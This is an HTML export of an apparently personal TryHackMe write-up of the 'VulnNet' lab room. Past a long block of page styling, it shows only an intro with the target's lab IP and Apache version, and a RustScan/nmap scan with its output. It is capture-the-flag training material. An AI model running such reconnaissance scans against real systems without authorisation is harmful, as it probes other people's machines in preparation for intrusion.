<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>VulnNet</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	text-indent: -1.7em;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-opaquegray { background-color: rgba(255, 255, 255, 0.0375); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="680bc1f8-5ea4-4f28-8599-3afb73ecddae" class="page sans"><header><img class="page-cover-image" src="https://www.notion.so/images/page-cover/webb2.jpg" style="object-position:center 70%"/><div class="page-header-icon page-header-icon-with-cover"><span class="icon">🙃</span></div><h1 class="page-title">VulnNet</h1><table class="properties"><tbody><tr class="property-row property-row-multi_select"><th><span class="icon property-icon"><svg viewBox="0 0 16 16" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesMultipleSelect"><path d="M1.91602 4.83789C2.44238 4.83789 2.87305 4.40723 2.87305 3.87402C2.87305 3.34766 2.44238 2.91699 1.91602 2.91699C1.38281 2.91699 0.952148 3.34766 0.952148 3.87402C0.952148 4.40723 1.38281 4.83789 1.91602 4.83789ZM5.1084 4.52344H14.3984C14.7607 4.52344 15.0479 4.23633 15.0479 3.87402C15.0479 3.51172 14.7607 3.22461 14.3984 3.22461H5.1084C4.74609 3.22461 4.45898 3.51172 4.45898 3.87402C4.45898 4.23633 4.74609 4.52344 5.1084 4.52344ZM1.91602 9.03516C2.44238 9.03516 2.87305 8.60449 2.87305 8.07129C2.87305 7.54492 2.44238 7.11426 1.91602 7.11426C1.38281 7.11426 0.952148 7.54492 0.952148 8.07129C0.952148 8.60449 1.38281 9.03516 1.91602 9.03516ZM5.1084 8.7207H14.3984C14.7607 8.7207 15.0479 8.43359 15.0479 8.07129C15.0479 7.70898 14.7607 7.42188 14.3984 7.42188H5.1084C4.74609 7.42188 4.45898 7.70898 4.45898 8.07129C4.45898 8.43359 4.74609 8.7207 5.1084 8.7207ZM1.91602 13.2324C2.44238 13.2324 2.87305 12.8018 2.87305 12.2686C2.87305 11.7422 2.44238 11.3115 1.91602 11.3115C1.38281 11.3115 0.952148 11.7422 0.952148 12.2686C0.952148 12.8018 1.38281 13.2324 1.91602 13.2324ZM5.1084 12.918H14.3984C14.7607 12.918 15.0479 12.6309 15.0479 12.2686C15.0479 11.9062 14.7607 11.6191 14.3984 11.6191H5.1084C4.74609 11.6191 4.45898 11.9062 4.45898 12.2686C4.45898 12.6309 4.74609 12.918 5.1084 12.918Z"></path></svg></span>Platform</th><td><span class="selected-value select-value-color-blue">TryHackMe</span></td></tr><tr class="property-row property-row-select"><th><span class="icon property-icon"><svg viewBox="0 0 16 16" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesSelect"><path d="M8 15.126C11.8623 15.126 15.0615 11.9336 15.0615 8.06445C15.0615 4.20215 11.8623 1.00293 7.99316 1.00293C4.13086 1.00293 0.938477 4.20215 0.938477 8.06445C0.938477 11.9336 4.1377 15.126 8 15.126ZM8 13.7383C4.85547 13.7383 2.33301 11.209 2.33301 8.06445C2.33301 4.91992 4.84863 2.39746 7.99316 2.39746C11.1377 2.39746 13.6738 4.91992 13.6738 8.06445C13.6738 11.209 11.1445 13.7383 8 13.7383ZM7.62402 10.6348C7.79492 10.915 8.20508 10.9287 8.37598 10.6348L10.666 6.73145C10.8574 6.41016 10.7002 6.04102 10.3652 6.04102H5.62793C5.29297 6.04102 5.14941 6.43066 5.32031 6.73145L7.62402 10.6348Z"></path></svg></span>Category</th><td><span class="selected-value select-value-color-orange">Web</span></td></tr><tr class="property-row property-row-select"><th><span class="icon property-icon"><svg viewBox="0 0 16 16" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesSelect"><path d="M8 15.126C11.8623 15.126 15.0615 11.9336 15.0615 8.06445C15.0615 4.20215 11.8623 1.00293 7.99316 1.00293C4.13086 1.00293 0.938477 4.20215 0.938477 8.06445C0.938477 11.9336 4.1377 15.126 8 15.126ZM8 13.7383C4.85547 13.7383 2.33301 11.209 2.33301 8.06445C2.33301 4.91992 4.84863 2.39746 7.99316 2.39746C11.1377 2.39746 13.6738 4.91992 13.6738 8.06445C13.6738 11.209 11.1445 13.7383 8 13.7383ZM7.62402 10.6348C7.79492 10.915 8.20508 10.9287 8.37598 10.6348L10.666 6.73145C10.8574 6.41016 10.7002 6.04102 10.3652 6.04102H5.62793C5.29297 6.04102 5.14941 6.43066 5.32031 6.73145L7.62402 10.6348Z"></path></svg></span>Difficulty</th><td><span class="selected-value select-value-color-orange">Medium</span></td></tr><tr class="property-row property-row-multi_select"><th><span class="icon property-icon"><svg viewBox="0 0 16 16" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesMultipleSelect"><path d="M1.91602 4.83789C2.44238 4.83789 2.87305 4.40723 2.87305 3.87402C2.87305 3.34766 2.44238 2.91699 1.91602 2.91699C1.38281 2.91699 0.952148 3.34766 0.952148 3.87402C0.952148 4.40723 1.38281 4.83789 1.91602 4.83789ZM5.1084 4.52344H14.3984C14.7607 4.52344 15.0479 4.23633 15.0479 3.87402C15.0479 3.51172 14.7607 3.22461 14.3984 3.22461H5.1084C4.74609 3.22461 4.45898 3.51172 4.45898 3.87402C4.45898 4.23633 4.74609 4.52344 5.1084 4.52344ZM1.91602 9.03516C2.44238 9.03516 2.87305 8.60449 2.87305 8.07129C2.87305 7.54492 2.44238 7.11426 1.91602 7.11426C1.38281 7.11426 0.952148 7.54492 0.952148 8.07129C0.952148 8.60449 1.38281 9.03516 1.91602 9.03516ZM5.1084 8.7207H14.3984C14.7607 8.7207 15.0479 8.43359 15.0479 8.07129C15.0479 7.70898 14.7607 7.42188 14.3984 7.42188H5.1084C4.74609 7.42188 4.45898 7.70898 4.45898 8.07129C4.45898 8.43359 4.74609 8.7207 5.1084 8.7207ZM1.91602 13.2324C2.44238 13.2324 2.87305 12.8018 2.87305 12.2686C2.87305 11.7422 2.44238 11.3115 1.91602 11.3115C1.38281 11.3115 0.952148 11.7422 0.952148 12.2686C0.952148 12.8018 1.38281 13.2324 1.91602 13.2324ZM5.1084 12.918H14.3984C14.7607 12.918 15.0479 12.6309 15.0479 12.2686C15.0479 11.9062 14.7607 11.6191 14.3984 11.6191H5.1084C4.74609 11.6191 4.45898 11.9062 4.45898 12.2686C4.45898 12.6309 4.74609 12.918 5.1084 12.918Z"></path></svg></span>Tags</th><td><span class="selected-value select-value-color-gray">Linux</span><span class="selected-value select-value-color-orange">php</span><span class="selected-value select-value-color-red">priv-esc</span><span class="selected-value select-value-color-pink">web</span></td></tr><tr class="property-row property-row-status"><th><span class="icon property-icon"><svg viewBox="0 0 16 16" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesStatus"><path d="M8.75488 1.02344C8.75488 0.613281 8.41309 0.264648 8.00293 0.264648C7.59277 0.264648 7.25098 0.613281 7.25098 1.02344V3.11523C7.25098 3.51855 7.59277 3.86719 8.00293 3.86719C8.41309 3.86719 8.75488 3.51855 8.75488 3.11523V1.02344ZM3.91504 5.0293C4.20215 5.31641 4.69434 5.32324 4.97461 5.03613C5.26855 4.74902 5.26855 4.25684 4.98145 3.96973L3.53906 2.52051C3.25195 2.2334 2.7666 2.21973 2.47949 2.50684C2.19238 2.79395 2.18555 3.28613 2.47266 3.57324L3.91504 5.0293ZM10.9629 4.01758C10.6826 4.30469 10.6826 4.79688 10.9697 5.08398C11.2568 5.37109 11.749 5.36426 12.0361 5.07715L13.4854 3.62793C13.7725 3.34082 13.7725 2.84863 13.4785 2.55469C13.1982 2.27441 12.7061 2.27441 12.4189 2.56152L10.9629 4.01758ZM15.0234 8.78906C15.4336 8.78906 15.7822 8.44727 15.7822 8.03711C15.7822 7.62695 15.4336 7.28516 15.0234 7.28516H12.9385C12.5283 7.28516 12.1797 7.62695 12.1797 8.03711C12.1797 8.44727 12.5283 8.78906 12.9385 8.78906H15.0234ZM0.975586 7.28516C0.56543 7.28516 0.223633 7.62695 0.223633 8.03711C0.223633 8.44727 0.56543 8.78906 0.975586 8.78906H3.07422C3.48438 8.78906 3.83301 8.44727 3.83301 8.03711C3.83301 7.62695 3.48438 7.28516 3.07422 7.28516H0.975586ZM12.0361 10.9902C11.749 10.71 11.2568 10.71 10.9629 10.9971C10.6826 11.2842 10.6826 11.7764 10.9697 12.0635L12.4258 13.5127C12.7129 13.7998 13.2051 13.793 13.4922 13.5059C13.7793 13.2256 13.7725 12.7266 13.4854 12.4395L12.0361 10.9902ZM2.52051 12.4395C2.22656 12.7266 2.22656 13.2188 2.50684 13.5059C2.79395 13.793 3.28613 13.7998 3.57324 13.5127L5.02246 12.0703C5.31641 11.7832 5.31641 11.291 5.03613 11.0039C4.74902 10.7168 4.25684 10.71 3.96973 10.9971L2.52051 12.4395ZM8.75488 12.9658C8.75488 12.5557 8.41309 12.207 8.00293 12.207C7.59277 12.207 7.25098 12.5557 7.25098 12.9658V15.0576C7.25098 15.4609 7.59277 15.8096 8.00293 15.8096C8.41309 15.8096 8.75488 15.4609 8.75488 15.0576V12.9658Z"></path></svg></span>Status</th><td><span class="status-value select-value-color-orange"><div class="status-dot status-dot-color-orange"></div>In progress</span></td></tr></tbody></table></header><div class="page-body"><p id="dd6d492a-1f27-41c7-ad2d-885665f1ce03" class=""><span style="border-bottom:0.05em solid"><em><strong>TABLE OF CONTENTS:</strong></em></span></p><p id="2e5da6a4-e0f0-4d6b-84c2-0a6a576a90e3" class=""><a href="https://www.notion.so/VulnNet-680bc1f85ea44f2885993afb73ecddae"><strong>Intro</strong></a></p><p id="8de0369f-04ac-46dc-98e1-7b99225fd8fa" class=""><a href="https://www.notion.so/VulnNet-680bc1f85ea44f2885993afb73ecddae"><strong>recon &amp; enum</strong></a></p><p id="bd3ac85b-0584-4dfc-b9c3-1e1d6f3f16bc" class=""><a href="https://www.notion.so/VulnNet-680bc1f85ea44f2885993afb73ecddae"><strong>Explotation</strong></a></p><p id="7d44a74a-03c6-48ef-90e4-858832da6098" class=""><a href="https://www.notion.so/VulnNet-680bc1f85ea44f2885993afb73ecddae"><strong>Privilege Escalation</strong></a></p><p id="a78d73ff-dd38-4068-9882-1fb472734460" class=""><a href="https://www.notion.so/VulnNet-680bc1f85ea44f2885993afb73ecddae"><strong>Flags</strong></a></p><p id="3a3389d3-8389-4baf-86dc-cb6fb9aa6504" class=""><a href="https://www.notion.so/VulnNet-680bc1f85ea44f2885993afb73ecddae"><strong>Imporved skill</strong></a></p><p id="0f26dfa1-1007-44b7-9780-2b4357e5724c" class=""><a href="https://www.notion.so/VulnNet-680bc1f85ea44f2885993afb73ecddae"><strong>Used tools</strong></a></p><hr id="b81c25d4-6ada-4612-886a-f9d38ce6634c"/><h1 id="76185536-9e4e-4bfc-979b-64e7f4bc63d0" class="">Intro:</h1><ul id="d84257e1-0b1e-418b-9684-dbe89ff9f759" class="bulleted-list"><li style="list-style-type:disc"><strong>Difficulty: </strong><strong><mark class="highlight-pink_background">Medium</mark></strong></li></ul><ul id="14b38e17-a2c4-447d-bf23-9e1148740f24" class="bulleted-list"><li style="list-style-type:disc"><strong>Web Language: </strong><strong><mark class="highlight-blue_background">PHP</mark></strong></li></ul><ul id="7e91b0c9-131e-41d2-aaa6-d91fe75183fb" class="bulleted-list"><li style="list-style-type:disc"><strong>HTTPServer: </strong><strong><mark class="highlight-teal_background">Ubuntu Linux</mark></strong></li></ul><ul id="52a0c01a-512d-48f4-b48f-a8d04f09d13a" class="bulleted-list"><li style="list-style-type:disc"><strong>Version: </strong><strong><mark class="highlight-purple_background">Apache/2.4.29</mark></strong></li></ul><ul id="ddc09f82-12e6-492d-90f4-adf50c71e3f8" class="bulleted-list"><li style="list-style-type:disc"><strong>IP: </strong><strong><mark class="highlight-pink_background">10.10.137.3</mark></strong></li></ul><h1 id="57c61004-b907-477f-a448-e97b154e38fc" class="">Recon &amp; Enum:</h1><ul id="2aed5df1-ee5b-42ae-bdc0-3e67d351bdb1" class="toggle"><li><details open=""><summary><strong>RustScan</strong></summary><pre id="54e727e7-0852-42ed-975c-a3825542333a" class="code"><code>┌──(nazu㉿Nazu)-[~/Desktop/CTF/THM-CTF/VulnNet]
└─$ sudo rustscan -a 10.10.137.3 0-20000 -- -sC -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-&#x27; `-&#x27;`-----&#x27;`----&#x27;  `-&#x27;  `----&#x27;  `---&#x27; `-&#x27;  `-&#x27;`-&#x27; `-&#x27;
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

Open 10.10.137.3:22
Open 10.10.137.3:80
[~] Starting Script(s)
[&gt;] Script to be run Some(&quot;nmap -vvv -p {{port}} {{ip}}&quot;)

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 eac9e867760a3f9709a7d7a663adc12c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwkZ4lon+5ZNgVQmItwLRcbDT9QrJJGvPrfqsbAnwk4dgPz1GDjIg+RwRIZIwPGRPpyvd01W1vh0BNs7Uh9f5RVuojlLxjqsN1876Jvt5Ma7ajC49lzxmtI8B5Vmwxx9cRA8JBvENm0+BTsDjpaj3JWllRffhD25Az/F1Tz3fSua1GiR7R2eEKSMrD38+QGG22AlrCNHvunCJkPmYH9LObHq9uSZ5PbJmqR3Yl3SJarCZ6zsKBG5Ka/xJL17QUB5o6ZRHgpw/pmw+JKWUkodIwPe4hCVH0dQkfVAATjlx9JXH95h4EPmKPvZuqHZyGUPE5jPiaNg6YCNCtexw5Wo41
|   256 0fc8f6d38e4cea67476884dc1c2b2e34 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA8L+SEmXtvfURdTRsmhaay/VJTFJzXYlU/0uKlPAtdpyZ8qaI55EQYPwcPMIbvyYtZM37Bypg0Uf7Sa8i1aTKk=
